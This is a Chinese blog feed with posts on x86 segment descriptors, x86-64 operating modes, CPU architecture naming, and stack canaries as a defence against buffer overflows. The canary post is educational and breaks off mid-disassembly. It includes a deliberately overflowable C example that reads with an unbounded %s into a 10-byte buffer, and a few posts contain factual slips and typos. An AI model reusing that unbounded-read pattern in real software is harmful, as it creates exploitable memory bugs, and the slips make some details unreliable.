data-pid="-Bk7GZdG">一个segment descriptor占8个字节，居然和现在64位系统的page table descriptor一样。一个segment对应的内存区域由base和limit确定，base占32位，limit占20位，最大为0xFFFFFH，这52位是表达地址的（页表使用20到36位存储地址），然后还剩下12个bit表达属性（上图红框部分），居然又和页表描述符是一样的，那再具体看看这些属性哪些和页表描述符是相同的，哪些是不同的。</p><p data-pid="Kpm5ehFi"><b>G</b> - Granularity，粒度，byte或者page，因为limit占20位，如果粒度为byte，则该segment的寻址范围是1MB，如果粒度为page（按4KB算），则该segment的寻址范围是4GB。所以，一个segment的size是由limit和G位共同确定的。</p><p data-pid="9yVDMFS8"><b>D/B</b> - Default Size/Bound，为1表示在32位模式下运行，为0在16位模式下运行。</p><p data-pid="XoqRny-r"><b>L</b> - 仅在64位系统中有效，为1表示在64位模式下运行，为0表示在32位兼容模式下运行。</p><p data-pid="8iiRi5av"><b>AVL</b> - Available for software，留给软件用的，但反正在linux里是被忽略的。</p><p data-pid="YCFF6UqO"><b>P</b> - Present, 同页表描述符里的P位。</p><p data-pid="_YaPn9jg"><b>DPL</b> - Descriptor Privledge Level，表示可以访问segment的最低级别。x86处理器的特权级别从ring 0到ring 3，数字越小，级别越高，通常用户空间运行于ring3，内核空间运行于ring0，所以这个基本等同于页表描述符里的U/S位。假设DPL为1，则只有当前特权级别为0或者1时，才可以访问该decriptor指向的segment。</p><p data-pid="9XNrNH2B"><b>S</b> - 对于code segment和data segment都是1，system segment（比如task state segment）为0。</p><p data-pid="DmeJ82A7"><b>Type</b> - 这个对于task segment是没有意义的，对于code segment和data segment主要是关于Writable，Executable的属性，等同于页表描述符中的R/W, XD。</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-d6f3f4f8a39f38b576915a4491ec0f38_b.jpg" data-caption="" data-size="normal" data-rawwidth="649" data-rawheight="366" class="origin_image zh-lightbox-thumb" width="649" data-original="https://pic1.zhimg.com/v2-d6f3f4f8a39f38b576915a4491ec0f38_r.jpg"/></noscript><div><img src="https://pic1.zhimg.com/80/v2-d6f3f4f8a39f38b576915a4491ec0f38_720w.webp" data-caption="" data-size="normal" data-rawwidth="649" data-rawheight="366" class="origin_image zh-lightbox-thumb lazy" width="649" data-original="https://pic1.zhimg.com/v2-d6f3f4f8a39f38b576915a4491ec0f38_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-d6f3f4f8a39f38b576915a4491ec0f38_b.jpg" data-original-token="v2-71a82bc3a35c3407257b0f1ca3e9a120" height="366" data-lazy-status="ok"></div></figure><p data-pid="KP1R2SxC">stack段也是可读写的，区别仅在于stack通常是向下增长的，所以也可视为data段的一种。对于这种向下增长的，需要注意是其地址边界不再是base+limit，而是base-limit。</p><p data-pid="qAjjfvjx"><b>A</b> - Accessed，同页表描述符里的A位一样。</p><p data-pid="nEyU15_T">当task运行时一个page的映射关系被建立，操作系统就需要在page table中添加一个entry记录映射的物理页面号，并填写权限控制位，形成一个descriptor，同样的，当一个segment建立，操作系统就需要在GDT中添加一个segment descriptor，那GDT又是什么呢？请看<a href="https://zhuanlan.zhihu.com/p/67714693" class="internal" data-za-detail-view-id="1043">下文</a>分解。</p><p class="ztext-empty-paragraph"><br></p><p data-pid="wkGKdmxw"><i>原创文章，转载请注明出处。</i></p></div></div></div></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/67735248">https://zhuanlan.zhihu.com/p/67735248</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>内存管理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86-64的几种运行模式</title>
    <link href="/2024/01/01/x86-64%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2024/01/01/x86-64%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>x86-64的几种运行模式的总结</p><span id="more"></span><h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>在32位时代，x86的operating mode有3种，实模式（Real Mode），保护模式（Protected Mode），虚拟8086模式（Virtual 8086 Mode）。</p><p>到了64位时代，又添加了长模式Long Mode（intel手册里还把它叫做IA-32e Mode），传统的三种模式则被统称为Legacy Mode。Long Mode又分为2种子模式，分别是64位长模式（64-Bit Mode）和64位兼容模式（Compatibility Mode）。</p><p>因为Long Mode使用64位虚拟地址，所以不管是64-Bit Mode还是Compatibility Mode的，都要求操作系统和工具链必须是64位的，其中64-Bit Mode又要求应用程序也得是64位的（纯纯的64位啊）。</p><p>因此，现存的32位应用程序可以不经重新编译就在处于Compatibility Mode的64位操作系统上运行，但要在处于Long Mode的64位操作系统上运行，就必须重新编译了。</p><p>各个模式之间的转换：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401010152368.png"></p><h1 id="cpu运行模式"><a href="#cpu运行模式" class="headerlink" title="cpu运行模式"></a>cpu运行模式</h1><p>通过下面这个表我们可以看到<code>x86-64</code>中的运行模式<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011503671.png"></p><p>在32位时代，x86的operating mode有3种，实模式（Real Mode），保护模式（Protected Mode），虚拟8086模式（Virtual 8086 Mode）。</p><h1 id="legacy-mode传统模式"><a href="#legacy-mode传统模式" class="headerlink" title="legacy mode传统模式"></a>legacy mode传统模式</h1><p>由于<code>long</code>模式的出现，所以AMD将之前的模式称之为传统模式。就是实模式、保护模式、虚拟8086模式。</p><p>传统模式与 <code>x86</code> 架构的现有 <code>32 </code>位处理器实现兼容。<strong>实现 <code>AMD64</code> 架构的处理器以传统实模式启动，就像实现传统 <code>x86</code> 架构的处理器一样。</strong></p><h2 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h2><p>复位或上电后，处理器始终首先进入实模式。保护模式是从实模式进入的。实模式是处理器初始化时的初始操作模式，它向后兼容原始 <code>Intel 8086</code> 和 <code>Intel 8088</code> 处理器。如今，实模式主要由操作系统引导加载程序使用，架构需要在转换到更高模式之前配置虚拟内存详细信息。任何需要通过传统 <code>BIOS</code> 风格的接口与系统固件进行通信的操作系统也可以使用此模式。</p><p>实模式支持使用简单的基于寄存器的内存分段的 <code>16</code> 位程序。它<strong>不支持分页或保护检查</strong>。在实模式下运行的程序最多可以访问 <code>1MB</code> 的内存空间。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>一般的应用程序都运行这个模式下。保护模式支持 <code>16</code> 位和 <code>32</code> 位程序，<strong>具有内存分段、可选分页和特权检查功能</strong>。在保护模式下运行的程序最多可以访问<code>4GB</code>的内存空间。</p><h2 id="虚拟8086模式"><a href="#虚拟8086模式" class="headerlink" title="虚拟8086模式"></a>虚拟8086模式</h2><p>虚拟8086模式是指利用一种硬件虚拟化技术，在<code>i386</code>的芯片上模拟出多个8086芯片。当处理器进入保护模式后，基于实模式的应用就不能直接运行了，采用虚拟8086模式，则可以让这些实模式的应用运行在基于保护模式的操作系统上，因此这种模式也被称为<code>Virtual Real Mode</code>。</p><p>该模式支持在保护模式下作为任务运行 16 位实模式程序。它使用<strong>简单形式的内存分段、可选分页和有限的保护检查</strong>。在虚拟8086模式下运行的程序最多可以访问<code>1MB</code>的内存空间。</p><h1 id="长模式"><a href="#长模式" class="headerlink" title="长模式"></a>长模式</h1><p>进入64位的x64处理器时代后，产生了一种新的运行模式，叫<code>Long Mode</code>（intel手册里还把它叫做IA-32e Mode），传统的三种模式则被统称为Legacy Mode。Long Mode又分为2种子模式，分别是64位长模式（64-Bit Mode）和64位兼容模式（Compatibility Mode）。</p><h2 id="64bit长模式"><a href="#64bit长模式" class="headerlink" title="64bit长模式"></a>64bit长模式</h2><p>在64bit的机器上，64bit的应用程序都运行在64bit长模式。同时32bit、16bit的原运行在<strong>保护模式下的应用程序则运行在64bit兼容模式。</strong>但是实模式和虚拟8086模式则不可以运行在64bit兼容模式。但是，可以通过创建在所需模式下运行的<strong>虚拟处理器</strong>，从在支持 VT-x 或 AMD-V 的处理器上以长模式运行的操作系统启动此类程序。</p><h2 id="兼容模式"><a href="#兼容模式" class="headerlink" title="兼容模式"></a>兼容模式</h2><p>在兼容模式下运行的应用程序使用 <code>32</code> 位或 <code>16</code> 位寻址，并且可以访问前 <code>4GB</code> 的虚拟地址空间。传统 <code>x86</code> 指令前缀在 <code>16</code> 位和 <code>32</code> 位地址和操作数大小之间切换。</p><p>与 <code>64</code> 位模式一样，兼容性模式由操作系统在单个代码段的基础上启用。然而，与 <code>64</code> 位模式不同的是，<code>x86</code> 分段功能与传统 <code>x86</code> 架构中相同，使用 <code>16</code> 位或 <code>32</code> 位保护模式语义。从应用程序的角度来看，兼容模式看起来就像传统的 <code>x86</code> 保护模式环境。然而，从操作系统的角度来看，地址转换、中断和异常处理以及系统数据结构都使用 <code>64</code> 位长模式机制。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>AMD64 Architecture Programmer’s Manual Volume 1:Application Programming</p><p>AMD64 Architecture Programmer’s Manual Volume 2:System Programming*</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的cpu架构</title>
    <link href="/2023/12/31/%E5%B8%B8%E8%A7%81%E7%9A%84cpu%E6%9E%B6%E6%9E%84/"/>
    <url>/2023/12/31/%E5%B8%B8%E8%A7%81%E7%9A%84cpu%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p><code>x86</code> <code>IA-32</code> <code>IA-64</code>和<code>x86-64</code>之间的关系</p><span id="more"></span><h1 id="关于x86-IA-32-IA-64和x86-64"><a href="#关于x86-IA-32-IA-64和x86-64" class="headerlink" title="关于x86 IA-32 IA-64和x86-64"></a>关于<code>x86</code> <code>IA-32</code> <code>IA-64</code>和<code>x86-64</code></h1><p>首先它们的历史出场顺序是由左到右。</p><p>x86泛指一系列基于Intel 8086且向后兼容的中央处理器指令集架构。最早的8086处理器于1978年由Intel推出，为16位微处理器。</p><p>该系列较早期的处理器名称是以数字来表示80x86。由于以“86”作为结尾，包括Intel 8086、80186、80286、80386以及80486，因此其架构被称为“x86”。由于数字并不能作为注册商标，因此Intel及其竞争者均在新一代处理器使用可注册的名称，如Pentium，来描述x86架构下的处理器产品。<strong>现时英特尔将其称为IA-32，全名为“Intel Architecture, 32-bit”，一般情形下指代32位的架构。</strong></p><p>也就是说<code>x86</code>最开始其实是16bit机器，直到intel对其不断升级至32bit。现在说<code>x86</code>都是值32bit。</p><p>8086是16位处理器；直到1985年32位的80386的开发，这个架构都维持是16位。接着一系列的处理器表示了32位架构的细微改进，推出了数种的扩展，直到2003年AMD对于这个架构发展了64位的扩展，并命名为AMD64。后来英特尔也推出了与之兼容的处理器，并命名为Intel 64。<strong>两者一般被统称为x86-64或x64，开创了x86的64位时代。</strong></p><p>需要注意的是这个Intel 64并不是IA-64 [安腾（Itanium）]。对于IA-64其实是intel公司和惠普公司在1990年代合作的成果，<strong>但是由于IA-64是全新的架构，其和intel自己的x86没有任何关系，也就是说其并不兼容x86。</strong>但是AMD的AMD64是兼容的，这一点很可能导致了IA-64的失败。2017年intel宣布取消生产安腾cpu。</p><p>x86-64&#x3D;AMD64&#x3D;intel64</p><blockquote><p>当涉及到 CPU 的时候，有许多术语：AArch64、x86_64、amd64、arm 等等。了解它们是什么以及它们之间的区别。</p></blockquote><p>当你查看数据表或软件下载页面时是否被 <code>ARM</code>、<code>AArch64</code>、<code>x86_64</code>、<code>i386</code> 等术语混淆？这些被称为 CPU 架构，我会帮你深入了解这个计算话题。</p><p>以下的表将为你总结每个字符串所代表的意义：</p><table><thead><tr><th>CPU 架构</th><th>描述</th></tr></thead><tbody><tr><td><strong><code>x86_64</code></strong> &#x2F;<code>x86</code>&#x2F;<code>amd64</code></td><td>64 位 AMD&#x2F;英特尔 CPU 的别称</td></tr><tr><td><strong><code>AArch64</code></strong> &#x2F;<code>arm64</code>&#x2F;<code>ARMv8</code>&#x2F;<code>ARMv9</code></td><td>64 位 ARM CPU 的别称</td></tr><tr><td><strong><code>i386</code></strong></td><td>32 位 AMD&#x2F;英特尔 CPU</td></tr><tr><td><strong><code>AArch32</code></strong> &#x2F;<code>arm</code>&#x2F;<code>ARMv1</code> 到 <code>ARMv7</code></td><td>32 位 ARM CPU 的别称</td></tr><tr><td><strong><code>rv64gc</code></strong> &#x2F;<code>rv64g</code></td><td>64 位 RISC-V CPU 的别称</td></tr><tr><td><strong><code>ppc64le</code></strong></td><td>64 位 PowerPC CPU，<strong>小端字节序存储</strong></td></tr></tbody></table><p>从左到右是使用该术语来描述 CPU 架构超过其右侧其他可选用术语的偏好。</p><p>从左到右是使用该术语描述 CPU 架构的优先级，使用左侧的而不是其右侧的其他可供选择的术语。</p><p>如果你像我一样是个极客，并想要更深入地解释，请继续阅读！</p><h1 id="概述：CPU-架构"><a href="#概述：CPU-架构" class="headerlink" title="概述：CPU 架构"></a>概述：CPU 架构</h1><p>通常来说，我之前列出的术语是描述 CPU 架构的。但严格讲，它们被计算机工程师视为 CPU 的 指令集架构Instruction Set Architecture（ISA）。</p><p>CPU 的指令集架构定义了 CPU 如何解析二进制代码中的 1 和 0。</p><p>这些 CPU 的 ISA 有几个主要的类别：</p><ul><li>x86（AMD&#x2F;英特尔）</li><li>ARM</li><li>RISC-V</li><li>PowerPC（IBM 仍在使用）</li></ul><p>当然，还有更多种类的 CPU ISA，比如 MIPS、SPARC、DEC Alpha 等等。但我列出的这些至今仍然被广泛使用（以某种形式）。</p><p>上述列出的 ISA 主要根据 <em>内存总线的宽度</em> 分为至少两个子集。内存总线的宽度指的是 CPU 和 RAM 一次能传输的位数。内存总线有很多种宽度，但最常见的是 32 位和 64 位。</p><blockquote><p>💡 32 位的 CPU ISA 要么是已经过时的历史产物，被留下来要么只是为了支持旧的系统，要么只运用在微控制器中。可以说，<strong>所有新的硬件都已经是 64 位的了</strong>，特别是那些面向消费者的硬件。</p></blockquote><h2 id="x86（AMD-英特尔）"><a href="#x86（AMD-英特尔）" class="headerlink" title="x86（AMD&#x2F;英特尔）"></a>x86（AMD&#x2F;英特尔）</h2><p>x86 CPU 的指令集架构主要源于英特尔，因为英特尔是最初搭配 8085 微处理器创建了它。8085 微处理器的内存总线宽度为 16 位。而后来，AMD 加入了这个领域，并且一直紧随英特尔的步伐，直到 AMD 创建出了自己的超集 64 位架构，超过了英特尔。</p><p>x86 架构的子集如下：</p><ul><li><code>i386</code>：如果你拥有的是 2007 年之前的 CPU，那么这可能就是你的 CPU 架构。它是现在使用的 AMD&#x2F;英特尔的 x86 架构的 32 位“版本”。</li><li><code>x86_64</code>&#x2F;<code>x86</code>&#x2F;<code>amd64</code>：这三个术语在不同的项目中可能会被交替使用。 但它们都是指 x86 AMD&#x2F;英特尔架构的 64 位“版本”。无论如何，<code>x86_64</code> 这个字符串比 <code>x86</code> 和 <code>amd64</code> 使用得更广泛（也更受欢迎）。例如，FreeBSD 项目称 64 位的 x86 架构为 <code>amd64</code>，而 Linux 和 macOS 则称之为 <code>x86_64</code>。</li></ul><blockquote><p>💡 由于 AMD 在创造 64 位 ISA 上超越了英特尔，所以一些项目（比如 FreeBSD）把 x86 的 64 位版本称为 <code>amd64</code>。<strong>但更被广泛接受的术语还是 x86_64</strong>。</p></blockquote><p>对于 CPU ISA，“x86” 这个字符串是一种特殊的情况。你要知道，在从 32 位的 x86（<code>i386</code>）到 64 位的 x86（<code>x86_64</code>）的过渡过程中，CPU 制造商确保了 CPU 能够运行 32 位 <em>和</em> 64 位指令。所以，有时你可能会看到 <code>x86</code> 也被用来意指“这款产品只能运行在 64 位的计算机上，但如果该计算机能运行 32 位指令，那么你也可以在它上面运行 32 位的用户软件”。</p><p>这种 x86 的模糊性——也就是诸如能同时运行 32 位代码的 64 位处理器——其主要用于和存在于运行在 64 位处理器上的，但是允许用户运行 32 位软件的操作系统，Windows 就通过这种被称作“兼容模式”的特性运用了这种方式。</p><p>汇总一下，由 AMD 和 英特尔 设计的 CPU 有两种架构：32 位的（<code>i386</code>）和 64 位的（<code>x86_84</code>）。</p><h2 id="其它的英特尔架构"><a href="#其它的英特尔架构" class="headerlink" title="其它的英特尔架构"></a>其它的英特尔架构</h2><p><code>x86_64</code> ISA 实际上有几个子集。这些子集都是 64 位，但它们新添加了诸如 SIMD（单指令多数据Single Instruction Multiple Data）指令等功能。</p><ul><li><code>x86_64-v1</code>：这是大多数人都熟知的基础 <code>x86_64</code> ISA。当人们谈论 <code>x86_64</code> 时，他们通常指的就是 <code>x86_64-v1</code> ISA。</li><li><code>x86_64-v2</code>：此版本新增了更多如 SSE3（流式 SIMD 扩展版本 3Streaming SIMD Extensions 3）之类的指令扩展。</li><li><code>x86_64-v3</code>：除了基础指令外，还新增了像 AVX（高级矢量扩展Advance Vector eXtensions）和 AVX2 等指令。这些指令可以<strong>使用高达 256 位宽的 CPU 寄存器</strong>！如果你能够有效利用它们，就能大规模并行处理计算任务。</li><li><code>x86_64-v4</code>：这个版本在 <code>x86_64-v3</code> ISA 的基础上，迭代了更多的 SIMD 指令扩展，比如 AVX256 和 AVX512。其中，AVX512 可以<strong>使用高达 512 位宽的 CPU 寄存器</strong>！</li></ul><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p>ARM 不仅是一家为 CPU ISA 制定规范的公司，它也设计并授权给其他厂商使用其 CPU 内核，甚至允许其他公司使用 ARM CPU ISA 设计自己的 CPU 内核。（最后那句话听起来就像是个 SQL 查询似的！）</p><p>你可能因为如树莓派这类的 单板计算机Single Board Computer）（SBC）听说过 ARM。但其实 ARM 的 CPU 还广泛应用于手机中。最近，苹果从使用 <code>x86_64</code> 处理器转向了在其笔记本和台式机产品中使用自家设计的 ARM 处理器。</p><p>就像任一种 CPU 架构一样，ARM 基于内存总线宽度也有两个子集。</p><p>官方认定的 32 位和 64 位 ARM 架构的名称分别是 <code>AArch32</code> 和 <code>AArch64</code>。这里的 <code>AArch</code> 字符串代表 “Arm 架构Arm Architecture”。这些是 CPU 执行指令时可切换的<strong>模式</strong>。</p><p>实际符合 ARM 的 CPU ISA 的指令规范被命名为 <code>ARMvX</code>，其中 <code>X</code> 是规范版本的代表数字。目前为止，已经有九个主要的规范版本。规范 <code>ARMv1</code> 到 <code>ARMv7</code> 定义了适用于 32 位 CPU 的架构，而 <code>ARMv8</code> 和 <code>ARMv9</code> 是适用于 64 位 ARM CPU 的规范。（<a href="https://en.wikipedia.org/wiki/ARM_architecture_family#Cores">更多信息在此</a>）</p><blockquote><p>💡 每个 ARM CPU 规范又有进一步的子规范。例如 ARMv8，我们有 ARMv8-R、ARMv8-A、ARMv8.1-A、ARMv8.2-A、ARMv8.3-A、ARMv8.4-A、ARMv8.5-A、ARMv8.6-A、ARMv8.7-A、ARMv8.8-A 和 ARMv8.9-A。 其中 -A 表示“应用核心”，-R 表示“实时核心”。</p></blockquote><p>你可能会觉得困惑，为什么在 <code>AArch64</code> 正式被 ARM 认定为 64 位 ARM 架构后，有些人仍然称其为 <code>arm64</code>。原因主要有两点：</p><ol><li><code>arm64</code> 这个名称在 ARM 决定采用 <code>AArch64</code> 之前就已经广为人知了。（ARM 的一些官方文档也将 64 位的 ARM 架构称为 <code>arm64</code>…… 😬）</li><li><a href="https://lore.kernel.org/lkml/CA+55aFxL6uEre-c=JrhPfts=7BGmhb2Js1c2ZGkTH8F=+rEWDg@mail.gmail.com/">Linus Torvalds 对 <code>AArch64</code> 这个名称表示不满。</a> 因此，Linux 的代码库主要将 <code>AArch64</code> 称为 <code>arm64</code>。然而，当你在系统中运行 <code>uname -m</code> 时，输出仍然是 <code>aarch64</code>。</li></ol><p>因此，对于 32 位 ARM CPU，你应该寻找 <code>AArch32</code> 这个字符串，但有时也可能是 <code>arm</code> 或 <code>armv7</code>。相似的，对于 64 位 ARM CPU，你应该找 <code>AArch64</code> 这个字符串，但有时也可能会是 <code>arm64</code>、<code>ARMv8</code> 或 <code>ARMv9</code>。</p><h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>RISC-V 是 CPU 指令集架构（ISA）的一个开源规范。**但这并不意味着 CPU 自身是开源的！**这有点像以太网的情况。以太网规范是开源的，但你需付费购买网线、路由器和交换器。同样，RISC-V CPU 也要花钱购买。 😃</p><p>尽管如此，这并没有阻止人们创建并在开源许可下提供免费获取（<strong>设计上的获取</strong>，并非物理核心&#x2F;SoC）的 RISC-V 核心。<a href="https://github.com/openhwgroup">这是其中的一项尝试</a>。</p><blockquote><p>💡 总结一下：如果你在寻找运行于 RISC-V 消费级 CPU 上的软件，你应该寻找 “<strong>rv64gc</strong>” 这一字符串。这是许多 Linux 发行版所公认的。</p></blockquote><p>像所有 CPU 架构一样，RISC-V 拥有 32 位和 64 位 CPU 架构。但由于 RISC-V 是非常新的描述 CPU ISA 的方式，大部分主流消费端或客户端的 CPU 核心一般都是 64 位的。大部分 32 位的设计都是微控制器，用于非常具体的用例。</p><p>它们的区别在于 CPU 的扩展。被称为 RISC-V CPU 的最低要求即实现“基本整数指令集Base Integer Instruction Set”（<code>rv64i</code>）。</p><p>下表列出了一些扩展及其描述：</p><table><thead><tr><th>扩展名称</th><th>描述</th></tr></thead><tbody><tr><td><code>rv64i</code></td><td>64 位基本整数指令集（<strong>必须的</strong>）</td></tr><tr><td><code>m</code></td><td>乘法和除法指令</td></tr><tr><td><code>a</code></td><td>原子指令</td></tr><tr><td><code>f</code></td><td>单精度浮点指令</td></tr><tr><td><code>d</code></td><td>双精度浮点指令</td></tr><tr><td><code>g</code></td><td>别名；一组运行<strong>通用</strong>操作系统所需的扩展集（包括 <code>imafd</code>）</td></tr><tr><td><code>c</code></td><td>压缩指令</td></tr></tbody></table><p>在 <code>rv64i</code> 这一字符串中，<code>rv</code> 表示 RISC-V，<code>64</code> 指的是 64 位 CPU 架构，而 <code>i</code> 指的是<strong>强制性的</strong>基本整数指令集扩展。 <code>rv64i</code> 之所以是一体的，因为即使 <code>i</code> 被认为是一种“扩展”，<strong>但它是必须的</strong>。</p><p>约定俗成的，扩展名称按上述特定顺序排列。因此，<code>rv64g</code> 展开为 <code>rv64imafd</code>，而不是 <code>rv64adfim</code>。</p><blockquote><p>💡 还有其他一些像 Zicsr 和 Zifencei 这样的扩展，它们位于 <code>d</code> 和 <code>g</code> 扩展之间，但我故意不列出，以避免令你感到害怕。</p><p>因此，严格说来，（在写这篇文章的时候）<code>rv64g</code> 实际上是 <code>rv64imafdZicsrZifencei</code>。<strong>恶魔般的笑声</strong></p></blockquote><h2 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h2><p>PowerPC 曾是苹果、IBM 以及，摩托罗拉早期合作时代的一种流行 CPU 架构。在苹果转向英特尔的 x86 架构之前，它一直被应用于苹果的全部消费品产品线。</p><p>最初，PowerPC 采取的是大端字节序的内存排序。后来随着 64 位架构的引入，增加了使用小端字节排序的选项。这么做的目的是为了与英特尔的内存排序保持兼容（以防止软件错误），因为英特尔自始至终都一直采用的是小端字节序。有关字节序的更多内容，我可以唠叨很久，不过你可以通过阅读 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Endianness">这篇 Mozilla 的文档</a> 来了解更多。</p><p>由于字节序在此也起到了一定的作用，PowerPC 共有三种架构：</p><ul><li><code>powerpc</code>：表示 32 位的 PowerPC 架构。</li><li><code>ppc64</code>：表示拥有<strong>大端字节序内存排序</strong>的 64 位 PowerPC 架构。</li><li><code>ppc64le</code>：表示拥有<strong>小端字节序内存排序</strong>的 64 位 PowerPC 架构。</li></ul><p>目前，**<code>ppc64le</code> 是被广泛使用的架构**。</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>市面上有各种各样的 CPU 架构。对于每一种架构，都有 32 位和 64 位的子集。在现有的 CPU 中，我们可以找到 x86、ARM、RISC-V 和 PowerPC 等架构。</p><p>其中，x86 是最广泛和易于获取的 CPU 架构，因为英特尔和 AMD 都采取了这种架构。此外，ARM 提供的产品几乎在手机和易于获取的单板计算机中被独占使用。</p><p>RISC-V 正在努力使硬件更广泛地被使用。我就有一款带有 RISC-V CPU 的单板计算机。 😉</p><p>而 PowerPC 主要用于服务器，至少当前如此。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zh.wikipedia.org/wiki/IA-64">https://zh.wikipedia.org/wiki/IA-64</a></p><p><a href="https://zh.wikipedia.org/wiki/X86">https://zh.wikipedia.org/wiki/X86</a></p><p><a href="https://linux.cn/article-16224-1.html">https://linux.cn/article-16224-1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的栈缓冲区溢出</title>
    <link href="/2023/12/31/Linux%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/12/31/Linux%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>总结Linux中的栈缓冲区溢出漏洞的缓解方法</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>缓冲区溢出漏洞是一种广泛存在且危害严重的漏洞，发现至今，关于此类漏洞的利用与防御技术不断发展.其中，栈缓冲区溢出漏洞的缓解机制主要有不可执行技术<code>(NX，on executable)</code>、地址随机化技术<code>(ASLR，address space layout randomization)</code>和栈保护机制<code>(SSP，stack smashing protector)</code>，相对应地也存在一些绕过手段，例如<code>return-to-libc</code>和<code>ROP</code>技术可以绕过<code>NX</code>；基于信息泄露的攻击使<code>ASLR</code>失效等.然而针对<code>SSP</code>防御机制，目前却没有有效的绕过技术</p><h1 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h1><p>Canaries(金丝雀)，取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用。这是一种对抗栈溢出的技术，又称之SSP栈保护机制，或者Stack Cookies，目前有4种具体的实现技术：StackGuard、StackShield、ProPolice以及XOR技术。</p><p>Canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出是从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先覆盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护栈的目的。</p><p><a href="http://html.rhhz.net/buptjournal/html/2017s127.htm">那么这个随机值是如何产生的？</a></p><p>Canaries通常可分为3类：terminator、random和random XOR，具体的实现有StackGuard、StackShield、ProPoliced等。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们通过一个例子来了解金丝雀机制是如何工作的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> arr [<span class="hljs-number">10</span>];<br>    sacnf(<span class="hljs-string">&quot;%s&quot;</span>,arr);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ter">gcc -Wstack-protector -g ./test.c<br></code></pre></td></tr></table></figure><p>通过<code>objdump -S ./a.out</code>查看反汇编。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs asm">#include &lt;stdio.h&gt;<br><br>int main (void)<br>&#123;<br>    1169:       f3 0f 1e fa             endbr64<br>    116d:       55                      push   %rbp<br>    116e:       48 89 e5                mov    %rsp,%rbp<br>    1171:       48 83 ec 20             sub    $0x20,%rsp<br>    1175:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax<br>    117c:       00 00<br>    117e:       48 89 45 f8             mov    %rax,-0x8(%rbp)<br>    1182:       31 c0                   xor    %eax,%eax<br>    char arry [10];<br>    